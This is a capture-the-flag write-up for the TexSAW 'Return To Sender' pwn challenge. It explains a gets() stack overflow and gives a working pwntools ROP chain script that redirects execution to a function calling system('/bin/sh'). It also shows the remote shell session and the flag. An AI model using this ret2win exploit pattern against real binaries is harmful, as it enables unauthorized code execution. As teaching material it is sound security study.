# Return To Sender — TexSAW CTF

**Category:** PWN
**Flag:** `texsaw{sm@sh_st4ck_2_r3turn_to_4nywh3re_y0u_w4nt}`

---

## Challenge Description

> Do you ever wonder what happens to your packages? So does your mail carrier.
>
> `nc 143.198.163.4 15858`

A 64-bit ELF binary is provided alongside a remote service. The theming is a postal service delivering packages to named addresses.

---

## Reconnaissance

### File & Protections

```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, not stripped

$ checksec --file=chall
RELRO:    Partial RELRO
Canary:   No canary found
NX:       NX disabled
PIE:      No PIE
```

All meaningful mitigations are absent:
- No stack canary — stack smashing goes undetected
- NX disabled — stack is executable (ret2shellcode is possible, but not needed)
- No PIE — all addresses are fixed and known at static analysis time

### Symbols

```
Functions: avenue, boulevard, court, deliver, drive, main, tool
PLT:       puts, setbuf, system, strcmp, gets
```

`system` is imported. `/bin/sh` is in the binary. This smells like a ret2win chain.

---

## Static Analysis

### `main`

Calls `deliver()` after setting up buffering.

### `deliver` — the vulnerable function

```c
void deliver() {
    char buf[32];                          // rbp-0x20
    puts("Where would you like to send your package?");
    puts("Some Options:\n0 Address Avenue\n1 Buffer Boulevard\n2 Canary Court");
    gets(buf);                             // ← unbounded read: classic overflow
    if (strcmp(buf, "0 Address Avenue") == 0)  { puts("..."); avenue();    }
    else if (strcmp(buf, "1 Buffer Boulevard") == 0) { puts("..."); boulevard(); }
    else if (strcmp(buf, "2 Canary Court") == 0)     { puts("..."); court();     }
    else puts("Sorry, we couldn't deliver your package. Returning to sender...");
}
```

`gets()` reads until a newline with no length limit. The buffer is 32 bytes. There is no stack canary. The return address is reachable at offset **40** (32-byte buffer + 8-byte saved RBP).

### `tool` — ROP gadget

```asm
0x4011b6  endbr64
0x4011ba  push rbp
0x4011bb  mov  rbp, rsp
0x4011be  pop  rdi      ; ← pop rdi; ret gadget
0x4011bf  ret
```

A `pop rdi; ret` gadget is conveniently embedded at `0x4011be`.

### `drive` — the win function

```c
void drive(long secret) {
    puts("Attempting secret delivery to 3 Dangerous Drive...");
    if (secret == 0x48435344) {
        puts("Success! Secret package delivered.");
        system("/bin/sh");             // ← shell
    } else {
        puts("Need the secret key to deliver this package.");
    }
}
```

If called with `rdi = 0x48435344`, `drive` executes `system("/bin/sh")`. The string `/bin/sh` lives at `0x4020ec` inside the binary itself.

---

## Exploit Strategy

The attack is a **ret2win via ROP chain**:

1. Send 40 bytes of padding to overflow `buf` and overwrite saved RBP.
2. Overwrite the return address with a ROP chain:
   - `ret` gadget (`0x40101a`) — aligns the stack to a 16-byte boundary before `system` is called (required by the System V AMD64 ABI).
   - `pop rdi; ret` (`0x4011be`) — loads the secret key into RDI.
   - `0x48435344` — the secret value `drive` checks for.
   - `drive` (`0x401211`) — jumps into the win function.

Stack layout after overflow:

```
[ 32 bytes buf  ]
[ 8 bytes rbp   ]  ← padding ends here
[ 0x40101a      ]  ret (stack align)
[ 0x4011be      ]  pop rdi; ret
[ 0x48435344    ]  secret key argument
[ 0x401211      ]  drive()  →  system("/bin/sh")
```

---

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

pop_rdi    = 0x4011be   # pop rdi; ret  (inside 'tool')
drive      = 0x401211   # calls system("/bin/sh") when rdi == 0x48435344
ret_gadget = 0x40101a   # plain ret for 16-byte stack alignment
SECRET     = 0x48435344

OFFSET = 40  # 32-byte buf + 8-byte saved rbp

payload  = b'A' * OFFSET
payload += p64(ret_gadget)
payload += p64(pop_rdi)
payload += p64(SECRET)
payload += p64(drive)

io = remote('143.198.163.4', 15858)
io.recvuntil(b'2 Canary Court\n\n')
io.sendline(payload)
io.interactive()
```

---

## Execution

```
$ python3 exploit.py
[+] Opening connection to 143.198.163.4 on port 15858: Done
[*] Switching to interactive mode

Sorry, we couldn't deliver your package. Returning to sender...

Attempting secret delivery to 3 Dangerous Drive...

Success! Secret package delivered.

$ cat flag.txt
texsaw{sm@sh_st4ck_2_r3turn_to_4nywh3re_y0u_w4nt}
```

---

## Key Takeaways

| Vulnerability | Detail |
|---|---|
| `gets()` with no bounds check | Allows unlimited stack overflow |
| No stack canary | Overflow goes undetected |
| No PIE | All gadget/function addresses are static |
| `system` + `/bin/sh` in binary | No libc leak required |
| `pop rdi; ret` gadget in `tool` | Enables clean argument setup for `drive` |

The challenge is a textbook **ret2win** — all the pieces (gadget, secret check, `system("/bin/sh")`) are provided in the binary itself. The only work is finding the offset, locating the gadgets, and chaining them correctly.
